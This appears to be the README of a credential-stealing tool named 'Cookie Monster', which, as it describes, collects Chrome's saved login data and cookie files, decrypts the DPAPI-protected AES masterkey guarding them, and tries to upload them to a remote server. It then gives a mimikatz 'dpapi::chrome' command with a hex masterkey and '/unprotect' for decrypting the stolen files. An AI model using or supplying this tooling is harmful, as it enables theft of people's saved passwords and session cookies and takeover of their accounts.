# Cookie Monster
* grabs the login data and cookies files from chrome
* decrypts the DPAPI-protectes AES masterkey used to protect both files
* attempts to upload them to a remote server


## Decrypting

Note that the `/key` argument should specify the masterkey as a hex string (case-insensitive), and that you can only decrypt one file at a time
```
mimikatz.exe

dpapi::chrome /in:"C:/path/to/file" /key:"47ac79a0...." /unprotect
```